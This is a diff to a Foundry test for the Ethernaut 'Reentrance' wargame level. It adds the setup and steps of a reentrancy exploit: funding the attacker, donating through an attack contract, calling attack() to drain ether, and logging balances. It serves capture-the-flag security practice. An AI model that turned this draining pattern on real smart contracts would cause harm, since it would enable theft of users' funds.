@@ -38,10 +38,30 @@ contract ReentranceTest is Test {
         ethernaut.registerLevel(reentranceFactory);
         vm.startPrank(eve);
 
+        /**
+         * @dev this 0.001 ether has nothing to do with the solution
+         * it is needed to create the level
+         *
+         * This is the ether that you can "steal" from the contract
+         *
+         * This has to be exactly 0.001 ether (check ReentranceFactory.sol)
+         */
+        vm.deal(eve, 0.001 ether);
+
         address payable levelAddress = payable(
-            ethernaut.createLevelInstance(reentranceFactory)
+            ethernaut.createLevelInstance{value: 0.001 ether}(reentranceFactory)
         );
         Reentrance reentranceContract = Reentrance(levelAddress);
+        // vm.deal(address(reentranceContract), 100 ether);
+
+        emit log_named_uint(
+            "Balance of the vulnerable contract (initial): ",
+            address(reentranceContract).balance
+        );
+
+        // Eve needs funds to donate to the contract
+        vm.deal(eve, 1 ether);
+        emit log_named_uint("Eve's ether balance: ", eve.balance);
 
         //                  Attack contract deployment                 //
         ReentranceAttack reentranceAttack = new ReentranceAttack(
@@ -53,6 +73,28 @@ contract ReentranceTest is Test {
         //////////////////////////////////////////////////////////////*/
 
         emit log_string("Starting the exploit... 🧨");
+
+        // 1 step - sending donation
+        emit log_string("Eve sends the donation...");
+        reentranceAttack.sendDonation{value: 0.01 ether}();
+        vm.deal(address(reentranceContract), 1 ether);
+
+        emit log_named_uint(
+            "Attack contract's balance in the contract after donation: ",
+            reentranceContract.balanceOf(address(reentranceAttack))
+        );
+
+        reentranceAttack.attack(0.01 ether);
+
+        emit log_named_uint(
+            "Attack contract balance in the contract after withdrawal: ",
+            reentranceContract.balanceOf(address(reentranceAttack))
+        );
+
+        emit log_named_uint(
+            "Attack contract ether balance after donation: ",
+            address(reentranceAttack).balance
+        );
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL SUBMISSION
